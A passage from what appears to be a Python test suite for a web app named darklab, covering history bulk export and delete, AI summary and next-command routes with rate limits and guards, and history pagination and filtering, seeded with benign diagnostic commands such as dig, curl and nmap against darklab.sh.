                "(run_id, rel_path, compression, byte_size, line_count, truncated, created) "
                "VALUES (?, ?, 'gzip', ?, 1, 0, datetime('now'))",
                (fallback_run_id, fallback_rel_path, fallback_artifact_path.stat().st_size),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (incomplete_run_id, session_id, "curl darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (running_run_id, session_id, "dig darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (other_run_id, "bulk-delete-other", "whois darklab.sh"),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                ("snap-" + owned_run_id, session_id, "owned snapshot", json.dumps([{"text": "snapshot line"}])),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                ("snap-" + full_run_id, session_id, "full snapshot", json.dumps([{"text": "snapshot first"}])),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                ("snap-" + other_run_id, "bulk-delete-other", "other snapshot", json.dumps([{"text": "other line"}])),
            )
            conn.commit()

        with mock.patch.object(history_routes, "active_runs_for_session", return_value=[{"run_id": running_run_id}]):
            export_resp = client.post(
                "/history/bulk-export",
                json={
                    "run_ids": [
                        full_run_id,
                        owned_run_id,
                        fallback_run_id,
                        incomplete_run_id,
                        running_run_id,
                        other_run_id,
                        missing_run_id,
                    ],
                    "snapshot_ids": ["snap-" + full_run_id, "snap-" + owned_run_id, "snap-" + other_run_id],
                    "format": "jsonl",
                },
                headers={"X-Session-ID": session_id},
            )
            with mock.patch.object(history_routes, "BULK_HISTORY_EXPORT_MAX_BYTES", 260):
                truncated_export_resp = client.post(
                    "/history/bulk-export",
                    json={"run_ids": [large_run_id], "snapshot_ids": [], "format": "jsonl"},
                    headers={"X-Session-ID": session_id},
                )
            txt_export_resp = client.post(
                "/history/bulk-export",
                json={
                    "run_ids": [owned_run_id, running_run_id],
                    "snapshot_ids": ["snap-" + owned_run_id],
                    "format": "txt",
                },
                headers={"X-Session-ID": session_id},
            )
            resp = client.post(
                "/history/bulk-delete",
                json={
                    "run_ids": [
                        owned_run_id,
                        full_run_id,
                        fallback_run_id,
                        incomplete_run_id,
                        running_run_id,
                        other_run_id,
                        missing_run_id,
                    ],
                },
                headers={"X-Session-ID": session_id},
            )
        assert export_resp.status_code == 200
        assert export_resp.content_type == "application/x-ndjson; charset=utf-8"
        assert "attachment" in export_resp.headers["Content-Disposition"]
        assert "darklab-history-" in export_resp.headers["Content-Disposition"]
        exported = [json.loads(line) for line in export_resp.data.decode("utf-8").splitlines()]
        assert [(item["kind"], item["id"]) for item in exported[:-1]] == [
            ("run", full_run_id),
            ("run", owned_run_id),
            ("run", fallback_run_id),
            ("snapshot", "snap-" + full_run_id),
            ("snapshot", "snap-" + owned_run_id),
        ]
        assert exported[0]["kind"] == "run"
        assert exported[0]["id"] == full_run_id
        assert exported[0]["lines"] == ["full artifact one", "full artifact two"]
        assert exported[0]["output_source"] == "full"
        assert exported[1]["id"] == owned_run_id
        assert exported[1]["lines"] == ["443/tcp open https"]
        assert exported[2]["id"] == fallback_run_id
        assert exported[2]["lines"] == ["fallback preview"]
        assert exported[2]["output_source"] == "preview"
        assert exported[3]["kind"] == "snapshot"
        assert exported[3]["id"] == "snap-" + full_run_id
        assert exported[3]["lines"] == ["snapshot first"]
        assert exported[4]["id"] == "snap-" + owned_run_id
        assert exported[4]["lines"] == ["snapshot line"]
        assert exported[-1]["kind"] == "summary"
        assert exported[-1]["items"] == 5
        assert exported[-1]["truncated"] is False
        assert exported[-1]["skipped"] == [
            {"kind": "run", "id": incomplete_run_id, "status": "rejected", "reason": "incomplete"},
            {"kind": "run", "id": running_run_id, "status": "rejected", "reason": "running"},
            {"kind": "run", "id": other_run_id, "status": "not_found"},
            {"kind": "run", "id": missing_run_id, "status": "not_found"},
            {"kind": "snapshot", "id": "snap-" + other_run_id, "status": "not_found"},
        ]
        assert truncated_export_resp.status_code == 200
        truncated_exported = [
            json.loads(line)
            for line in truncated_export_resp.data.decode("utf-8").splitlines()
        ]
        assert truncated_exported == [{
            "kind": "summary",
            "items": 0,
            "skipped": [],
            "truncated": True,
        }]
        assert txt_export_resp.status_code == 200
        assert txt_export_resp.content_type == "text/plain; charset=utf-8"
        txt_export = txt_export_resp.data.decode("utf-8")
        assert "darklab history export\nitems: 2\ntruncated: no" in txt_export
        assert f"-- run {owned_run_id} --" in txt_export
        assert "443/tcp open https" in txt_export
        assert f"-- snapshot snap-{owned_run_id} --" in txt_export
        assert f"-- skipped --\n{running_run_id}\trun\trunning\n" in txt_export
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["counts"] == {"deleted": 3, "not_found": 2, "rejected": 2}
        assert data["results"] == [
            {"run_id": owned_run_id, "status": "deleted"},
            {"run_id": full_run_id, "status": "deleted"},
            {"run_id": fallback_run_id, "status": "deleted"},
            {"run_id": incomplete_run_id, "status": "rejected", "reason": "incomplete"},
            {"run_id": running_run_id, "status": "rejected", "reason": "running"},
            {"run_id": other_run_id, "status": "not_found"},
            {"run_id": missing_run_id, "status": "not_found"},
        ]
        with sqlite3.connect(DB_PATH) as conn:
            remaining_ids = {
                row[0]
                for row in conn.execute(
                    "SELECT id FROM runs WHERE id IN (?, ?, ?, ?)",
                    (owned_run_id, incomplete_run_id, running_run_id, other_run_id),
                ).fetchall()
            }
            conn.execute(
                "DELETE FROM snapshots WHERE id IN (?, ?, ?)",
                ("snap-" + owned_run_id, "snap-" + full_run_id, "snap-" + other_run_id),
            )
            conn.execute("DELETE FROM runs WHERE id = ?", (large_run_id,))
            conn.commit()
        assert remaining_ids == {incomplete_run_id, running_run_id, other_run_id}

    def test_bulk_delete_history_rejects_malformed_ids(self):
        client = get_client()
        session_id = "bulk-delete-malformed"
        overlong_id = "r" * 513

        non_string_resp = client.post(
            "/history/bulk-delete",
            json={"run_ids": ["run-ok", 123]},
            headers={"X-Session-ID": session_id},
        )
        assert non_string_resp.status_code == 400
        assert json.loads(non_string_resp.data) == {"error": "run_ids entries must be strings"}

        overlong_resp = client.post(
            "/history/bulk-delete",
            json={"run_ids": [overlong_id]},
            headers={"X-Session-ID": session_id},
        )
        assert overlong_resp.status_code == 400
        assert json.loads(overlong_resp.data) == {"error": "run_ids entries are too long", "limit": 512}

        too_many_resp = client.post(
            "/history/bulk-delete",
            json={"run_ids": [f"run-{index}" for index in range(101)]},
            headers={"X-Session-ID": session_id},
        )
        assert too_many_resp.status_code == 400
        assert json.loads(too_many_resp.data) == {"error": "too_many", "limit": 100}

        empty_export_resp = client.post(
            "/history/bulk-export",
            json={"run_ids": [], "snapshot_ids": [], "format": "jsonl"},
            headers={"X-Session-ID": session_id},
        )
        assert empty_export_resp.status_code == 400
        assert json.loads(empty_export_resp.data) == {"error": "selection_required"}

        bad_format_resp = client.post(
            "/history/bulk-export",
            json={"run_ids": ["run-ok"], "format": "zip"},
            headers={"X-Session-ID": session_id},
        )
        assert bad_format_resp.status_code == 400
        assert json.loads(bad_format_resp.data) == {"error": "unsupported_format", "formats": ["txt", "jsonl"]}

        too_many_export_resp = client.post(
            "/history/bulk-export",
            json={"run_ids": [f"run-{index}" for index in range(501)], "format": "jsonl"},
            headers={"X-Session-ID": session_id},
        )
        assert too_many_export_resp.status_code == 400
        assert json.loads(too_many_export_resp.data) == {"error": "too_many", "limit": 500}

    def test_get_run_nonexistent_returns_404(self):
        client = get_client()
        resp = client.get(
            "/history/nonexistent-run-id",
            headers={"X-Session-ID": "history-missing-run-session"},
        )
        assert resp.status_code == 404

    def test_ai_summary_routes_enqueue_and_list_session_scoped_assists(self):
        from services.ai import assists as ai_assists

        client = get_client()
        session = "ai-route-session"
        other_session = "ai-route-other"
        run_id = "run-ai-route"
        active_run_id = "run-ai-active"
        no_context_run_id = "run-ai-no-context"
        guard_run_id = "run-ai-guards"
        output_rows = [
            {"text": "Starting scan for darklab.sh with several useful details", "cls": "", "tsC": "", "tsE": ""},
            {"text": "443/tcp open https and 80/tcp open http were detected", "cls": "", "tsC": "", "tsE": ""},
            {"text": "The next useful step is to inspect TLS and response headers", "cls": "", "tsC": "", "tsE": ""},
        ]
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
                    "VALUES (?, ?, 'external', 'nmap -sV darklab.sh', ?, ?, 0, ?, ?)",
                    (
                        run_id,
                        session,
                        "2026-05-23T11:00:00+00:00",
                        "2026-05-23T11:00:02+00:00",
                        json.dumps(output_rows),
                        len(output_rows),
                    ),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                    "VALUES (?, ?, 'external', 'sleep 30', ?, ?, 1)",
                    (active_run_id, session, "2026-05-23T11:00:00+00:00", json.dumps(output_rows[:1])),
                )
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
                    "VALUES (?, ?, 'external', 'true', ?, ?, 0, ?, 1)",
                    (
                        no_context_run_id,
                        session,
                        "2026-05-23T11:00:00+00:00",
                        "2026-05-23T11:00:01+00:00",
                        json.dumps([{"text": "ok", "cls": "", "tsC": "", "tsE": ""}]),
                    ),
                )
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
                    "VALUES (?, ?, 'external', 'nmap darklab.sh', ?, ?, 0, ?, ?)",
                    (
                        guard_run_id,
                        session,
                        "2026-05-23T11:00:00+00:00",
                        "2026-05-23T11:00:02+00:00",
                        json.dumps(output_rows),
                        len(output_rows),
                    ),
                )
                conn.commit()

            with mock.patch.dict(config.CFG, {
                "ai_enabled": True,
                "ai_feature_summary": True,
                "ai_feature_next_commands": True,
                "ai_model": "llama3.1:8b",
                "ai_max_input_chars": 8000,
                "ai_max_queue_depth": 1000,
                "ai_rate_limit_per_session_hour": 20,
                "ai_rate_limit_global_per_minute": 20,
                "share_redaction_enabled": False,
            }), mock.patch.object(process, "redis_client", process._FakeRedisClient()):
                with mock.patch.object(ai_assists.log, "info") as info_log:
                    queued = client.post(f"/runs/{run_id}/ai-summary", json={}, headers={"X-Session-ID": session})
                    suggested = client.post(f"/runs/{run_id}/ai-next-commands", json={}, headers={"X-Session-ID": session})
                    enqueue_events = [
                        (call.args[0], call.kwargs["extra"])
                        for call in info_log.call_args_list
                        if call.args and call.args[0] == "AI_ASSIST_ENQUEUE_RESULT"
                    ]
                missing_summary_session = client.post(f"/runs/{run_id}/ai-summary", json={})
                missing_next_session = client.post(f"/runs/{run_id}/ai-next-commands", json={})
                listed = client.get(f"/runs/{run_id}/ai-assists", headers={"X-Session-ID": session})
                cross = client.get(f"/runs/{run_id}/ai-assists", headers={"X-Session-ID": other_session})
                active = client.post(f"/runs/{active_run_id}/ai-summary", json={}, headers={"X-Session-ID": session})
                invalid_body = client.post(
                    f"/runs/{guard_run_id}/ai-summary",
                    json=[],
                    headers={"X-Session-ID": session},
                )
                with sqlite3.connect(DB_PATH) as conn:
                    conn.execute(
                        "UPDATE ai_run_assists SET status = 'completed', payload = ? WHERE run_id = ?",
                        (json.dumps({"summary": "cached"}), run_id),
                    )
                    conn.commit()
                with mock.patch.object(ai_assists.log, "info") as reuse_log:
                    cached = client.post(f"/runs/{run_id}/ai-summary", json={}, headers={"X-Session-ID": session})
                    forced = client.post(f"/runs/{run_id}/ai-summary", json={"force": True}, headers={"X-Session-ID": session})

                guard_cases = []
                base_guard_cfg = {
                    "ai_enabled": True,
                    "ai_feature_summary": True,
                    "ai_feature_next_commands": True,
                    "ai_model": "llama3.1:8b",
                    "ai_max_input_chars": 8000,
                    "ai_max_queue_depth": 1000,
                    "ai_rate_limit_per_session_hour": 20,
                    "ai_rate_limit_global_per_minute": 20,
                    "diagnostics_allowed_cidrs": [],
                    "share_redaction_enabled": False,
                }
                for cfg_patch, path, expected_status, expected_error in (
                    (
                        {"ai_enabled": False},
                        f"/runs/{guard_run_id}/ai-summary",
                        403,
                        "ai_disabled",
                    ),
                    (
                        {"ai_enabled": True, "ai_feature_summary": False},
                        f"/runs/{guard_run_id}/ai-summary",
                        403,
                        "ai_feature_disabled",
                    ),
                    (
                        {"ai_enabled": True, "ai_feature_next_commands": False},
                        f"/runs/{guard_run_id}/ai-next-commands",
                        403,
                        "ai_feature_disabled",
                    ),
                ):
                    with mock.patch.dict(config.CFG, {**base_guard_cfg, **cfg_patch}, clear=False), \
                         mock.patch.object(process, "redis_client", process._FakeRedisClient()):
                        guard_cases.append((expected_status, expected_error, client.post(
                            path,
                            json={},
                            headers={"X-Session-ID": session},
                        )))
                busy_lock = mock.MagicMock()
                busy_lock.__enter__.return_value = False
                busy_lock.__exit__.return_value = False
                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), \
                     mock.patch.object(process, "redis_client", process._FakeRedisClient()), \
                     mock.patch.object(ai_assists, "enqueue_lock", return_value=busy_lock):
                    guard_cases.append((429, "ai_busy", client.post(
                        f"/runs/{guard_run_id}/ai-summary",
                        json={},
                        headers={"X-Session-ID": session},
                    )))
                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), \
                     mock.patch.object(process, "redis_client", None):
                    guard_cases.append((503, "ai_unavailable", client.post(
                        f"/runs/{guard_run_id}/ai-summary",
                        json={},
                        headers={"X-Session-ID": session},
                    )))
                with mock.patch.dict(config.CFG, {
                    **base_guard_cfg,
                    "ai_rate_limit_per_session_hour": 1,
                }, clear=False), mock.patch.object(process, "redis_client", process._FakeRedisClient()):
                    rate_first = client.post(
                        f"/runs/{guard_run_id}/ai-summary",
                        json={},
                        headers={"X-Session-ID": session},
                    )
                    rate_limited = client.post(
                        f"/runs/{guard_run_id}/ai-summary",
                        json={},
                        headers={"X-Session-ID": session},
                    )
                with mock.patch.dict(config.CFG, base_guard_cfg, clear=False), \
                     mock.patch.object(process, "redis_client", process._FakeRedisClient()), \
                     mock.patch.object(ai_assists, "build_run_context", return_value=mock.Mock(useful=False)):
                    no_context = client.post(
                        f"/runs/{no_context_run_id}/ai-summary",
                        json={},
                        headers={"X-Session-ID": session},
                    )

            queued_payload = json.loads(queued.data)
            suggested_payload = json.loads(suggested.data)
            listed_payload = json.loads(listed.data)
            cached_payload = json.loads(cached.data)
            forced_payload = json.loads(forced.data)
            assert queued.status_code == 202
            assert queued_payload["assist"]["status"] == "queued"
            assert queued_payload["assist"]["variant"] == "summary"
            assert suggested.status_code == 202
            assert suggested_payload["assist"]["status"] == "queued"
            assert suggested_payload["assist"]["variant"] == "next_commands"
            assert missing_summary_session.status_code == 401
            assert json.loads(missing_summary_session.data)["error"] == "session_required"
            assert missing_next_session.status_code == 401
            assert json.loads(missing_next_session.data)["error"] == "session_required"
            assert listed.status_code == 200
            assert {assist["id"] for assist in listed_payload["assists"]} == {
                queued_payload["assist"]["id"],
                suggested_payload["assist"]["id"],
            }
            assert cross.status_code == 404
            assert active.status_code == 409
            assert json.loads(active.data)["error"] == "ai_run_active"
            assert invalid_body.status_code == 400
            assert json.loads(invalid_body.data)["error"] == "invalid_body"
            for expected_status, expected_error, response in guard_cases:
                assert response.status_code == expected_status
                assert json.loads(response.data)["error"] == expected_error
            assert rate_first.status_code == 202
            assert rate_limited.status_code == 429
            assert json.loads(rate_limited.data)["error"] == "ai_rate_limited"
            assert no_context.status_code == 422
            assert json.loads(no_context.data)["error"] == "ai_no_context"
            assert _ai_assist_count_for_run(no_context_run_id) == 0
            assert _ai_assist_count_for_run(guard_run_id) == 1
            assert cached.status_code == 200
            assert cached_payload["assist"]["id"] == queued_payload["assist"]["id"]
            assert forced.status_code == 202
            assert forced_payload["assist"]["id"] != queued_payload["assist"]["id"]
            assert forced_payload["assist"]["status"] == "queued"
            assert [event for event, _extra in enqueue_events] == ["AI_ASSIST_ENQUEUE_RESULT"] * 2
            assert {extra["variant"] for _event, extra in enqueue_events} == {"summary", "next_commands"}
            reuse_events = [
                (call.args[0], call.kwargs["extra"])
                for call in reuse_log.call_args_list
                if call.args and call.args[0] == "AI_ASSIST_ENQUEUE_RESULT"
            ]
            assert [event for event, _extra in reuse_events] == ["AI_ASSIST_ENQUEUE_RESULT"] * 2
            assert reuse_events[0][1] == {
                "assist_id": queued_payload["assist"]["id"],
                "run_id": run_id,
                "session": session,
                "variant": "summary",
                "status": "completed",
                "inserted": False,
                "force": False,
                "model": "llama3.1:8b",
                "prompt_version": "ai-assist-v1",
                "prompt_version_source": "canonical",
                "input_chars": mock.ANY,
                "estimated_input_tokens": mock.ANY,
                "redacted_bytes": 0,
                "pre_redaction_bytes": mock.ANY,
            }
            assert reuse_events[1][1] == {
                "assist_id": forced_payload["assist"]["id"],
                "run_id": run_id,
                "session": session,
                "variant": "summary",
                "status": "queued",
                "inserted": True,
                "force": True,
                "model": "llama3.1:8b",
                "prompt_version": "ai-assist-v1",
                "prompt_version_source": "canonical",
                "input_chars": mock.ANY,
                "estimated_input_tokens": mock.ANY,
                "redacted_bytes": 0,
                "pre_redaction_bytes": mock.ANY,
            }
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "DELETE FROM ai_run_assists WHERE run_id IN (?, ?, ?, ?)",
                    (run_id, active_run_id, no_context_run_id, guard_run_id),
                )
                conn.execute(
                    "DELETE FROM runs WHERE id IN (?, ?, ?, ?)",
                    (run_id, active_run_id, no_context_run_id, guard_run_id),
                )
                conn.commit()

    def test_history_respects_panel_limit_and_sorts_newest_first(self):
        client = get_client()
        session = "limit-test-session"
        run_ids = ["limit-run-1", "limit-run-2", "limit-run-3"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "echo one", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "echo two", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "echo three", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]"),
            )
            conn.commit()
            conn.close()

            with mock.patch.dict("config.CFG", {"history_panel_limit": 2}):
                resp = client.get("/history", headers={"X-Session-ID": session})
            data = json.loads(resp.data)
            commands = [r["command"] for r in data["runs"]]

            assert commands == ["echo three", "echo two"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_commands_returns_distinct_recent_commands_without_exit_filter(self):
        client = get_client()
        session = "commands-distinct-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-{i}" for i in range(5)]
        rows = [
            (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", 0),
            (run_ids[1], session, "curl -I https://darklab.sh", "2026-01-01T00:00:02", 7),
            (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:03", 1),
            (run_ids[3], session, "ping darklab.sh", "2026-01-01T00:00:04", 0),
            (run_ids[4], session, "nmap -sV darklab.sh", "2026-01-01T00:00:05", 2),
        ]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                [(run_id, sid, cmd, started, started, code, "[]") for run_id, sid, cmd, started, code in rows],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history/commands?limit=3",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert resp.status_code == 200
            assert data["commands"] == [
                "nmap -sV darklab.sh",
                "ping darklab.sh",
                "dig darklab.sh A",
            ]
            assert data["limit"] == 3
            assert len(data["runs"]) == 3
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_history_reports_totals_and_keeps_roots_complete_across_pages(self):
        client = get_client()
        session = "pagination-test-session"
        run_ids = ["page-run-1", "page-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "nmap -sV darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?page=2&page_size=1&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["page"] == 2
            assert data["page_size"] == 1
            assert data["total_count"] == 2
            assert data["page_count"] == 2
            assert data["has_prev"] is True
            assert data["has_next"] is False
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["roots"] == ["nmap", "dig"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_applies_starred_only_server_side(self):
        client = get_client()
        session = "starred-filter-session"
        run_ids = ["star-run-1", "star-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "ping darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "dig darklab.sh A", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                (session, "dig darklab.sh A"),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?starred_only=1&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert data["page_count"] == 1
            assert [r["command"] for r in data["runs"]] == ["dig darklab.sh A"]
            assert data["roots"] == ["dig"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.execute(
                "DELETE FROM starred_commands WHERE session_id = ? AND command IN (?, ?)",
                (session, "ping darklab.sh", "dig darklab.sh A"),
            )
            conn.commit()
            conn.close()

    def test_history_can_return_snapshot_items(self):
        client = get_client()
        session = "snapshot-history-session"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                ("snap-history-1", session, "baseline scan", "2026-01-01T00:00:03", "[]"),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'snapshot', ?, 'handoff', ?)",
                ("label-snap-history-1", session, "snap-history-1", "2026-01-01T00:00:04"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'snapshot', ?, 'snapshot note', ?, ?)",
                (
                    "note-snap-history-1",
                    session,
                    "snap-history-1",
                    "2026-01-01T00:00:04",
                    "2026-01-01T00:00:04",
                ),
            )
            conn.commit()
            conn.close()

            resp = client.get(
                "/history?type=snapshots&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert data["runs"] == []
            assert data["items"][0]["type"] == "snapshot"
            assert data["items"][0]["label"] == "baseline scan"
            assert data["items"][0]["labels"][0]["label"] == "handoff"
            assert data["items"][0]["note"]["body"] == "snapshot note"
            assert data["items"][0]["label_count"] == 1
            assert data["items"][0]["note_count"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM entity_labels WHERE entity_id = ?", ("snap-history-1",))
            conn.execute("DELETE FROM entity_notes WHERE entity_id = ?", ("snap-history-1",))
            conn.execute("DELETE FROM snapshots WHERE id = ?", ("snap-history-1",))
            conn.commit()
            conn.close()

    def test_history_filters_run_subtypes(self):
        client = get_client()
        session = "history-run-subtypes-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-builtin", f"{session}-external"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, run_kind, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                [
                    (
                        run_ids[0],
                        session,
                        "builtin",
                        "project list",
                        "2026-01-01T00:00:01",
                        "2026-01-01T00:00:02",
                        0,
                        "[]",
                    ),
                    (
                        run_ids[1],
                        session,
                        "external",
                        "nmap darklab.sh",
                        "2026-01-01T00:00:03",
                        "2026-01-01T00:00:04",
                        0,
                        "[]",
                    ),
                ],
            )
            conn.commit()
            conn.close()

            builtins = json.loads(client.get(
                "/history?type=runs_builtin&include_total=1",
                headers={"X-Session-ID": session},
            ).data)
            external = json.loads(client.get(
                "/history?type=runs_external&include_total=1",
                headers={"X-Session-ID": session},
            ).data)

            assert [item["id"] for item in builtins["items"]] == [run_ids[0]]
            assert builtins["items"][0]["run_kind"] == "builtin"
            assert builtins["total_count"] == 1
            assert [item["id"] for item in external["items"]] == [run_ids[1]]
            assert external["items"][0]["run_kind"] == "external"
            assert external["total_count"] == 1
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany("DELETE FROM runs WHERE id = ?", [(run_id,) for run_id in run_ids])
            conn.commit()
            conn.close()

    def test_history_filters_runs_by_project_and_ignores_legacy_snapshot_links(self):
        client = get_client()
        session = "project-history-" + uuid.uuid4().hex[:8]
        project_resp = client.post(
            "/projects",
            json={"name": "History Project"},
            headers={"X-Session-ID": session},
        )
        project = json.loads(project_resp.data)["project"]
        linked_run = f"{session}-run-linked"
        other_run = f"{session}-run-other"
        linked_snapshot = f"{session}-snapshot-linked"
        other_snapshot = f"{session}-snapshot-other"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.executemany(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                [
                    (linked_run, session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
                    (other_run, session, "nmap darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
                ],
            )
            conn.executemany(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                [
                    (linked_snapshot, session, "linked snapshot", "2026-01-01T00:00:05", "[]"),
                    (other_snapshot, session, "other snapshot", "2026-01-01T00:00:06", "[]"),
                ],
            )
            conn.executemany(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, ?, ?, ?, datetime('now'))",
                [
                    (f"{session}-link-run", project["id"], "run", linked_run, "manual"),
                    (f"{session}-link-snapshot", project["id"], "snapshot", linked_snapshot, "migration"),
                ],
            )
            conn.commit()
            conn.close()

            resp = client.get(
                f"/history?project_id={project['id']}&include_total=1",
                headers={"X-Session-ID": session},
            )
            data = json.loads(resp.data)

            assert data["total_count"] == 1
            assert [item["id"] for item in data["items"]] == [linked_run]
            assert [run["id"] for run in data["runs"]] == [linked_run]
            assert data["roots"] == ["dig"]
            assert data["items"][0]["project_link_count"] == 1
            assert data["items"][0]["project_links"][0]["project_id"] == project["id"]
            assert data["items"][0]["project_links"][0]["project"]["name"] == "History Project"
            assert data["runs"][0]["project_link_count"] == 1
            assert data["runs"][0]["project_links"][0]["project_id"] == project["id"]

            snapshots_resp = client.get(
                f"/history?type=snapshots&project_id={project['id']}&include_total=1",
                headers={"X-Session-ID": session},
            )
            snapshots = json.loads(snapshots_resp.data)
            assert snapshots["total_count"] == 0
            assert snapshots["items"] == []
            assert snapshots["runs"] == []
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM project_links WHERE project_id = ?", (project["id"],))
            conn.execute("DELETE FROM snapshots WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.execute("DELETE FROM projects WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_history_search_filters_by_command_text(self):
        client = get_client()
        session = "history-search-session"
        run_ids = ["search-run-1", "search-run-2"]
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "dig darklab.sh A", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
